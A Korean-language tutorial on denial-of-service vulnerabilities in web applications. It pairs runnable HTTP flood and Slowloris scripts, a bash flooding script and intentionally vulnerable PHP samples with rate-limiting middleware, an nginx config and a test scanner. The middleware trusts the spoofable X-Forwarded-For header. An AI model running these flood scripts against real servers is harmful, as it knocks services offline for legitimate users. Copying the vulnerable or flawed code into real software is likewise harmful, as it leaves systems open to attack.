# DoS (Denial of Service) Attack 취약점 분석

## 📋 취약점 개요

**DoS (Denial of Service) 공격**은 시스템의 정상적인 서비스를 방해하여 합법적인 사용자가 서비스를 이용할 수 없도록 만드는 공격입니다. 웹 애플리케이션에서는 대량의 요청, 리소스 고갈, 애플리케이션 로직 악용 등을 통해 서비스를 마비시킬 수 있습니다.

### 🎯 공격 원리

1. **리소스 고갈**: CPU, 메모리, 디스크, 네트워크 대역폭 소진
2. **연결 고갈**: 네트워크 연결 풀 소진
3. **애플리케이션 로직 악용**: 비효율적인 연산이나 무한 루프 유발
4. **분산 공격**: 여러 소스에서 동시 공격 (DDoS)

### 🔍 주요 위험성

- **CVSS 점수**: 7.5 (High)
- **서비스 중단**: 정상 사용자의 서비스 접근 불가
- **비즈니스 손실**: 매출 감소 및 신뢰도 하락
- **인프라 비용**: 추가 리소스 확보를 위한 비용 증가

## 🚨 공격 시나리오

### 시나리오 1: HTTP Flood Attack

```python
# 대용량 HTTP 요청 공격
import requests
import threading
import time

def http_flood_attack():
    target_url = "http://target.com/expensive-operation"
    
    def send_requests():
        while True:
            try:
                # 대용량 POST 데이터
                large_data = "A" * 1024 * 1024  # 1MB 데이터
                requests.post(target_url, 
                            data={'payload': large_data}, 
                            timeout=1)
            except:
                continue
    
    # 100개 스레드로 동시 공격
    threads = []
    for i in range(100):
        thread = threading.Thread(target=send_requests)
        threads.append(thread)
        thread.daemon = True
        thread.start()
    
    # 공격 지속
    time.sleep(3600)  # 1시간 동안 공격

# 위험: 실제로 실행하지 마세요
# http_flood_attack()
```

### 시나리오 2: Resource Exhaustion (PHP)

```php
<?php
// 취약한 PHP 코드 - 메모리 소진 공격에 취약
function processData($data) {
    $processed = [];
    
    // 무제한 배열 확장 (메모리 소진)
    for ($i = 0; $i < count($data); $i++) {
        $processed[] = str_repeat($data[$i], 10000);  // 각 항목을 10,000배 확장
    }
    
    return $processed;
}

// 공격자가 대용량 데이터를 전송하면 메모리 소진
if (isset($_POST['data'])) {
    $result = processData($_POST['data']);
    echo json_encode($result);
}
?>
```

### 시나리오 3: CPU Exhaustion

```php
<?php
// CPU 집약적 연산 악용
function vulnerableHashFunction($input, $iterations = null) {
    $iterations = $iterations ?? 100;  // 기본값
    
    // 공격자가 높은 iterations 값을 전달하면 CPU 소진
    $hash = $input;
    for ($i = 0; $i < $iterations; $i++) {
        $hash = hash('sha256', $hash);
    }
    
    return $hash;
}

// /hash.php?input=test&iterations=10000000
$input = $_GET['input'] ?? 'default';
$iterations = (int)($_GET['iterations'] ?? 100);

echo vulnerableHashFunction($input, $iterations);
?>
```

### 시나리오 4: Database Connection Pool Exhaustion

```php
<?php
// 데이터베이스 연결 고갈 공격
class VulnerableDBHandler {
    public function searchProducts($query) {
        // 새로운 DB 연결을 매번 생성 (연결 풀 고갈)
        $pdo = new PDO($dsn, $username, $password);
        
        // 복잡한 쿼리 - 공격자가 와일드카드로 전체 테이블 스캔 유발
        $stmt = $pdo->prepare("
            SELECT * FROM products p
            JOIN categories c ON p.category_id = c.id  
            JOIN reviews r ON p.id = r.product_id
            WHERE p.name LIKE ? 
            OR p.description LIKE ?
            OR c.name LIKE ?
            ORDER BY p.created_at DESC
        ");
        
        $searchTerm = '%' . $query . '%';
        $stmt->execute([$searchTerm, $searchTerm, $searchTerm]);
        
        return $stmt->fetchAll();
    }
}

// 공격자가 복잡한 검색어로 대량 요청 시 DB 연결 고갈
$handler = new VulnerableDBHandler();
$results = $handler->searchProducts($_GET['q'] ?? '');
?>
```

### 시나리오 5: Regular Expression DoS (ReDoS)

```php
<?php
// 취약한 정규표현식 - ReDoS 공격에 취약
function validateInput($input) {
    // 복잡한 중첩 정규표현식 - 백트래킹으로 인한 성능 저하
    $pattern = '/^(a+)+$/';  // 매우 위험한 패턴
    
    if (preg_match($pattern, $input)) {
        return true;
    }
    
    return false;
}

// 공격자가 "aaaaaaaaaaaaaaaaaaaaX" 같은 입력으로 ReDoS 유발
$input = $_POST['input'] ?? '';
$isValid = validateInput($input);  // 매우 오래 걸릴 수 있음
?>
```

## 🛡️ 방어 방법

### 1. Rate Limiting 및 Request Throttling

```php
<?php
class DoSProtectionMiddleware {
    private $redis;
    private $config;
    
    public function __construct($redis_connection, $config = []) {
        $this->redis = $redis_connection;
        $this->config = array_merge([
            'requests_per_minute' => 60,
            'burst_limit' => 100,
            'ban_duration' => 3600,  // 1시간
            'cpu_limit' => 80,       // CPU 사용률 80%
            'memory_limit' => '128M',
            'max_request_size' => '10M',
            'max_execution_time' => 30
        ], $config);
    }
    
    public function handle($request, $next) {
        $client_ip = $this->getClientIP($request);
        
        // 1. IP 기반 Rate Limiting
        if (!$this->checkRateLimit($client_ip)) {
            $this->logDoSAttempt($client_ip, 'rate_limit_exceeded');
            return $this->createErrorResponse('Rate limit exceeded', 429);
        }
        
        // 2. 요청 크기 제한
        if (!$this->checkRequestSize($request)) {
            $this->logDoSAttempt($client_ip, 'request_size_exceeded');
            return $this->createErrorResponse('Request too large', 413);
        }
        
        // 3. 시스템 리소스 확인
        if (!$this->checkSystemResources()) {
            $this->logDoSAttempt($client_ip, 'system_overload');
            return $this->createErrorResponse('Service temporarily unavailable', 503);
        }
        
        // 4. 실행 시간 제한 설정
        set_time_limit($this->config['max_execution_time']);
        ini_set('memory_limit', $this->config['memory_limit']);
        
        // 5. 요청 처리 시작 시간 기록
        $start_time = microtime(true);
        
        // 실제 요청 처리
        $response = $next($request);
        
        // 6. 실행 시간 모니터링
        $execution_time = microtime(true) - $start_time;
        $this->logRequestMetrics($client_ip, $execution_time);
        
        return $response;
    }
    
    private function checkRateLimit($client_ip) {
        $key = "rate_limit:$client_ip";
        $current_time = time();
        $window_start = $current_time - 60; // 1분 윈도우
        
        // Redis Sliding Window Rate Limiting
        $pipe = $this->redis->multi(Redis::PIPELINE);
        $pipe->zremrangebyscore($key, 0, $window_start);
        $pipe->zcard($key);
        $pipe->zadd($key, $current_time, uniqid());
        $pipe->expire($key, 60);
        
        $results = $pipe->exec();
        $request_count = $results[1];
        
        if ($request_count > $this->config['requests_per_minute']) {
            // 일시적 차단
            $this->redis->setex("blocked:$client_ip", 
                               $this->config['ban_duration'], 
                               time());
            return false;
        }
        
        return true;
    }
    
    private function checkRequestSize($request) {
        $max_size = $this->parseSize($this->config['max_request_size']);
        
        // Content-Length 헤더 확인
        $content_length = $_SERVER['CONTENT_LENGTH'] ?? 0;
        if ($content_length > $max_size) {
            return false;
        }
        
        // POST 데이터 크기 확인
        if (!empty($_POST)) {
            $post_size = strlen(http_build_query($_POST));
            if ($post_size > $max_size) {
                return false;
            }
        }
        
        return true;
    }
    
    private function checkSystemResources() {
        // CPU 사용률 확인
        $cpu_usage = $this->getCPUUsage();
        if ($cpu_usage > $this->config['cpu_limit']) {
            return false;
        }
        
        // 메모리 사용률 확인
        $memory_usage = memory_get_usage(true);
        $memory_limit = $this->parseSize(ini_get('memory_limit'));
        
        if ($memory_usage > $memory_limit * 0.8) {  // 80% 임계값
            return false;
        }
        
        // 디스크 공간 확인
        $free_space = disk_free_space('/');
        $total_space = disk_total_space('/');
        
        if (($free_space / $total_space) < 0.1) {  // 10% 미만 남은 경우
            return false;
        }
        
        return true;
    }
    
    private function getCPUUsage() {
        $load = sys_getloadavg();
        return $load[0];  // 1분 평균 로드
    }
    
    private function parseSize($size) {
        $units = ['B' => 1, 'K' => 1024, 'M' => 1024*1024, 'G' => 1024*1024*1024];
        $size = trim($size);
        $last = strtoupper(substr($size, -1));
        
        if (isset($units[$last])) {
            return intval($size) * $units[$last];
        }
        
        return intval($size);
    }
    
    private function logDoSAttempt($ip, $reason) {
        $log_data = [
            'timestamp' => date('Y-m-d H:i:s'),
            'ip' => $ip,
            'reason' => $reason,
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
            'request_uri' => $_SERVER['REQUEST_URI'] ?? ''
        ];
        
        error_log('DOS_ATTEMPT: ' . json_encode($log_data));
    }
    
    private function logRequestMetrics($ip, $execution_time) {
        if ($execution_time > 10) {  // 10초 이상 걸린 요청
            $log_data = [
                'timestamp' => date('Y-m-d H:i:s'),
                'ip' => $ip,
                'execution_time' => $execution_time,
                'memory_usage' => memory_get_peak_usage(true),
                'request_uri' => $_SERVER['REQUEST_URI'] ?? ''
            ];
            
            error_log('SLOW_REQUEST: ' . json_encode($log_data));
        }
    }
    
    private function createErrorResponse($message, $status_code) {
        http_response_code($status_code);
        header('Content-Type: application/json');
        
        return json_encode([
            'error' => $message,
            'status' => $status_code,
            'timestamp' => time()
        ]);
    }
    
    private function getClientIP($request) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
               $_SERVER['HTTP_CLIENT_IP'] ?? 
               $_SERVER['REMOTE_ADDR'] ?? 
               'unknown';
    }
}
?>
```

### 2. 애플리케이션 레벨 최적화

```php
<?php
class OptimizedApplicationHandler {
    private $cache;
    private $db_pool;
    
    public function __construct($cache_connection, $db_pool) {
        $this->cache = $cache_connection;
        $this->db_pool = $db_pool;
    }
    
    // 안전한 검색 함수
    public function safeSearchProducts($query, $page = 1, $limit = 20) {
        // 입력 검증
        if (strlen($query) > 100) {
            throw new InvalidArgumentException('Search query too long');
        }
        
        if ($page < 1 || $page > 100) {
            throw new InvalidArgumentException('Invalid page number');
        }
        
        if ($limit < 1 || $limit > 50) {
            throw new InvalidArgumentException('Invalid limit');
        }
        
        // 캐시 키 생성
        $cache_key = "search:" . md5($query . $page . $limit);
        
        // 캐시에서 결과 확인
        $cached_result = $this->cache->get($cache_key);
        if ($cached_result) {
            return json_decode($cached_result, true);
        }
        
        // DB 연결 풀에서 연결 가져오기
        $pdo = $this->db_pool->getConnection();
        
        try {
            // 최적화된 쿼리 - 인덱스 사용
            $offset = ($page - 1) * $limit;
            $stmt = $pdo->prepare("
                SELECT p.id, p.name, p.price, p.description
                FROM products p
                WHERE MATCH(p.name, p.description) AGAINST (? IN BOOLEAN MODE)
                ORDER BY p.created_at DESC
                LIMIT ? OFFSET ?
            ");
            
            $stmt->execute([$query, $limit, $offset]);
            $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
            
            // 결과를 캐시에 저장 (5분)
            $this->cache->setex($cache_key, 300, json_encode($results));
            
            return $results;
            
        } finally {
            // 연결을 풀에 반환
            $this->db_pool->releaseConnection($pdo);
        }
    }
    
    // 안전한 해시 함수
    public function safeHashFunction($input, $iterations = 100) {
        // Iterations 제한
        if ($iterations > 1000) {
            throw new InvalidArgumentException('Too many iterations');
        }
        
        if (strlen($input) > 1000) {
            throw new InvalidArgumentException('Input too long');
        }
        
        // 캐시 확인
        $cache_key = "hash:" . md5($input . $iterations);
        $cached_hash = $this->cache->get($cache_key);
        
        if ($cached_hash) {
            return $cached_hash;
        }
        
        // 제한된 해시 연산
        $hash = $input;
        for ($i = 0; $i < $iterations; $i++) {
            $hash = hash('sha256', $hash);
        }
        
        // 결과 캐시 (1시간)
        $this->cache->setex($cache_key, 3600, $hash);
        
        return $hash;
    }
    
    // ReDoS 방지 정규표현식 검증
    public function safeRegexValidation($input, $pattern) {
        // 입력 길이 제한
        if (strlen($input) > 1000) {
            throw new InvalidArgumentException('Input too long for regex validation');
        }
        
        // 위험한 정규표현식 패턴 감지
        $dangerous_patterns = [
            '/\(\.\*\)\+/',     // (.*)+
            '/\(\.\+\)\+/',     # (.+)+
            '/\([^)]*\)\*\2/',  # 백참조와 함께 사용되는 패턴
        ];
        
        foreach ($dangerous_patterns as $dangerous) {
            if (preg_match($dangerous, $pattern)) {
                throw new SecurityException('Potentially dangerous regex pattern');
            }
        }
        
        // 타임아웃 설정
        $old_limit = ini_get('pcre.backtrack_limit');
        $old_recursion = ini_get('pcre.recursion_limit');
        
        ini_set('pcre.backtrack_limit', '10000');
        ini_set('pcre.recursion_limit', '10000');
        
        try {
            $result = preg_match($pattern, $input);
            
            // PCRE 에러 확인
            if (preg_last_error() !== PREG_NO_ERROR) {
                throw new RuntimeException('Regex execution failed: ' . preg_last_error());
            }
            
            return $result;
            
        } finally {
            // 설정 복원
            ini_set('pcre.backtrack_limit', $old_limit);
            ini_set('pcre.recursion_limit', $old_recursion);
        }
    }
}
?>
```

### 3. 인프라 레벨 DoS 방어

```nginx
# Nginx 설정으로 DoS 방어
server {
    listen 80;
    server_name example.com;
    
    # 연결 제한
    limit_conn_zone $binary_remote_addr zone=conn_limit_per_ip:10m;
    limit_req_zone $binary_remote_addr zone=req_limit_per_ip:10m rate=5r/s;
    
    location / {
        # 연결 수 제한 (IP당 10개)
        limit_conn conn_limit_per_ip 10;
        
        # 요청 빈도 제한 (초당 5개, 버스트 10개)
        limit_req zone=req_limit_per_ip burst=10 delay=5;
        
        # 요청 크기 제한
        client_max_body_size 10m;
        client_body_buffer_size 1m;
        
        # 타임아웃 설정
        client_body_timeout 12;
        client_header_timeout 12;
        keepalive_timeout 15;
        send_timeout 10;
        
        # 느린 요청 차단
        client_body_timeout 5s;
        client_header_timeout 5s;
        
        proxy_pass http://backend;
    }
    
    # 정적 파일 직접 서빙 (PHP 부하 감소)
    location ~* \.(jpg|jpeg|png|gif|ico|css|js)$ {
        expires 1y;
        add_header Cache-Control "public, immutable";
        try_files $uri =404;
    }
    
    # 위험한 요청 차단
    location ~ /\. {
        deny all;
    }
    
    location ~ \.(sql|log|tar|gz)$ {
        deny all;
    }
    
    # 에러 페이지 커스터마이징
    error_page 429 /429.html;
    error_page 503 /503.html;
}

# 전역 설정
events {
    worker_connections 1024;
    use epoll;
    multi_accept on;
}

http {
    # 기본 제한 설정
    limit_req_status 429;
    limit_conn_status 503;
    
    # gzip 압축으로 대역폭 절약
    gzip on;
    gzip_comp_level 6;
    gzip_types text/plain text/css application/json application/javascript;
}
```

## 🧪 테스트 방법

### 1. 부하 테스트 도구

```bash
#!/bin/bash
# 다양한 DoS 공격 시뮬레이션

# 1. Apache Bench로 기본 부하 테스트
echo "=== Basic Load Test ==="
ab -n 10000 -c 100 -t 60 http://target.com/

# 2. 대용량 POST 요청 테스트
echo "=== Large POST Request Test ==="
# 10MB 데이터 생성
dd if=/dev/zero of=large_data.txt bs=1M count=10

# 대용량 POST 전송
for i in {1..50}; do
    curl -X POST -d @large_data.txt http://target.com/upload &
done
wait

# 3. Slowloris 공격 시뮬레이션
echo "=== Slowloris Test ==="
python3 << 'EOF'
import socket
import threading
import time

def slowloris_attack():
    target = "target.com"
    port = 80
    sockets = []
    
    for i in range(200):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
            sockets.append(sock)
        except:
            continue
    
    # 연결 유지
    while True:
        for sock in sockets[:]:
            try:
                sock.send(b"X-a: b\r\n")
                time.sleep(10)
            except:
                sockets.remove(sock)

# 주의: 실제로는 실행하지 마세요
# slowloris_attack()
EOF

# 4. ReDoS 테스트
echo "=== ReDoS Test ==="
curl -X POST \
     -d 'input=aaaaaaaaaaaaaaaaaaaaX' \
     -d 'pattern=^(a+)+$' \
     http://target.com/regex-test

# 5. 메모리 소진 테스트
echo "=== Memory Exhaustion Test ==="
for i in {1..10}; do
    curl -X POST \
         -d "data=$(python3 -c 'print("A" * 1000000)')" \
         http://target.com/process-data &
done
wait

echo "DoS tests completed"
```

### 2. 자동화된 DoS 취약점 스캐너

```python
import requests
import threading
import time
import psutil
import subprocess

class DoSVulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.results = []
        
    def test_rate_limiting(self):
        """Rate limiting 테스트"""
        print("Testing rate limiting...")
        
        def make_requests():
            responses = []
            for i in range(100):
                try:
                    response = requests.get(self.target_url, timeout=5)
                    responses.append(response.status_code)
                except:
                    responses.append(None)
            return responses
        
        start_time = time.time()
        responses = make_requests()
        end_time = time.time()
        
        # 429 (Too Many Requests) 응답이 있는지 확인
        rate_limited = 429 in responses
        avg_response_time = (end_time - start_time) / len([r for r in responses if r])
        
        self.results.append({
            'test': 'rate_limiting',
            'protected': rate_limited,
            'avg_response_time': avg_response_time,
            'total_requests': len(responses),
            'successful_requests': len([r for r in responses if r == 200])
        })
    
    def test_resource_exhaustion(self):
        """리소스 소진 공격 테스트"""
        print("Testing resource exhaustion...")
        
        # 대용량 데이터 전송
        large_data = "A" * (1024 * 1024)  # 1MB
        
        try:
            response = requests.post(
                self.target_url + "/upload",
                data={'file': large_data},
                timeout=30
            )
            
            if response.status_code == 413:  # Request Entity Too Large
                resource_protected = True
            elif response.status_code == 200:
                resource_protected = False
            else:
                resource_protected = 'Unknown'
                
        except requests.Timeout:
            resource_protected = 'Timeout (possible DoS)'
        except Exception as e:
            resource_protected = f'Error: {str(e)}'
        
        self.results.append({
            'test': 'resource_exhaustion',
            'protected': resource_protected,
            'payload_size': '1MB'
        })
    
    def test_slowloris(self):
        """Slowloris 공격 테스트"""
        print("Testing Slowloris vulnerability...")
        
        import socket
        from urllib.parse import urlparse
        
        parsed_url = urlparse(self.target_url)
        host = parsed_url.netloc.split(':')[0]
        port = int(parsed_url.netloc.split(':')[1]) if ':' in parsed_url.netloc else 80
        
        connected_sockets = 0
        
        try:
            for i in range(50):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((host, port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n")
                connected_sockets += 1
                time.sleep(0.1)
        except Exception as e:
            pass
        
        self.results.append({
            'test': 'slowloris',
            'connected_sockets': connected_sockets,
            'vulnerability': connected_sockets > 30  # 임의의 임계값
        })
    
    def test_redos(self):
        """정규식 DoS 테스트"""
        print("Testing ReDoS vulnerability...")
        
        # 위험한 정규식과 입력
        test_cases = [
            {
                'pattern': '^(a+)+$',
                'input': 'a' * 20 + 'X',
                'name': 'nested_quantifiers'
            },
            {
                'pattern': '^(a|a)*$', 
                'input': 'a' * 25,
                'name': 'alternation_with_overlap'
            }
        ]
        
        for test_case in test_cases:
            try:
                start_time = time.time()
                response = requests.post(
                    self.target_url + "/validate",
                    data={
                        'pattern': test_case['pattern'],
                        'input': test_case['input']
                    },
                    timeout=10
                )
                execution_time = time.time() - start_time
                
                self.results.append({
                    'test': f'redos_{test_case["name"]}',
                    'execution_time': execution_time,
                    'vulnerable': execution_time > 5,  # 5초 이상이면 취약
                    'pattern': test_case['pattern']
                })
                
            except requests.Timeout:
                self.results.append({
                    'test': f'redos_{test_case["name"]}',
                    'execution_time': 'timeout',
                    'vulnerable': True,
                    'pattern': test_case['pattern']
                })
    
    def test_concurrent_connections(self):
        """동시 연결 테스트"""
        print("Testing concurrent connection limits...")
        
        def make_long_request():
            try:
                response = requests.get(
                    self.target_url + "/slow-endpoint",
                    timeout=30
                )
                return response.status_code
            except:
                return None
        
        # 50개 동시 연결 시도
        threads = []
        for i in range(50):
            thread = threading.Thread(target=make_long_request)
            threads.append(thread)
            thread.start()
        
        # 잠시 후 추가 요청으로 서비스 가능 여부 확인
        time.sleep(2)
        
        try:
            test_response = requests.get(self.target_url, timeout=5)
            service_available = test_response.status_code == 200
        except:
            service_available = False
        
        # 스레드 정리
        for thread in threads:
            thread.join(timeout=1)
        
        self.results.append({
            'test': 'concurrent_connections',
            'service_available_during_load': service_available,
            'concurrent_requests': 50
        })
    
    def generate_report(self):
        """테스트 결과 보고서 생성"""
        print("\n" + "="*50)
        print("DoS Vulnerability Assessment Report")
        print("="*50)
        
        for result in self.results:
            print(f"\nTest: {result['test']}")
            for key, value in result.items():
                if key != 'test':
                    print(f"  {key}: {value}")
        
        # 전반적인 평가
        vulnerabilities = []
        if any(r.get('vulnerable', False) for r in self.results):
            vulnerabilities.append("ReDoS vulnerabilities detected")
        
        if not any(r.get('protected', False) for r in self.results if r['test'] == 'rate_limiting'):
            vulnerabilities.append("No rate limiting detected")
        
        print(f"\nOverall Assessment:")
        if vulnerabilities:
            print("VULNERABLE - Issues found:")
            for vuln in vulnerabilities:
                print(f"  - {vuln}")
        else:
            print("PROTECTED - No major vulnerabilities detected")
        
        return self.results

# 사용 예제
scanner = DoSVulnerabilityScanner("http://target.com")

# 모든 테스트 실행
scanner.test_rate_limiting()
scanner.test_resource_exhaustion()
scanner.test_slowloris()
scanner.test_redos()
scanner.test_concurrent_connections()

# 보고서 생성
report = scanner.generate_report()
```

## 📚 참고 자료

### 공식 문서
- [OWASP DoS Prevention](https://owasp.org/www-community/attacks/Denial_of_Service)
- [NIST Cybersecurity Framework - DoS](https://www.nist.gov/cyberframework)

### 보안 가이드
- [Cloudflare DoS Protection](https://developers.cloudflare.com/ddos-protection/)
- [AWS Shield Documentation](https://docs.aws.amazon.com/shield/)

### 도구 및 리소스
- [Apache Bench (ab)](https://httpd.apache.org/docs/2.4/programs/ab.html)
- [HULK DoS Tool](https://github.com/grafov/hulk)
- [Nginx Rate Limiting](https://www.nginx.com/blog/rate-limiting-nginx/)

---

## 🎯 핵심 요약

1. **다층 방어**: Rate Limiting, 리소스 제한, 애플리케이션 최적화
2. **모니터링**: 실시간 시스템 리소스 및 트래픽 모니터링
3. **자동 대응**: 임계값 초과 시 자동 차단 및 스케일링
4. **정기 테스트**: 부하 테스트를 통한 시스템 한계 파악

**⚠️ 주의**: DoS 공격은 다양한 형태로 진화하므로 지속적인 모니터링과 대응 체계가 필요합니다.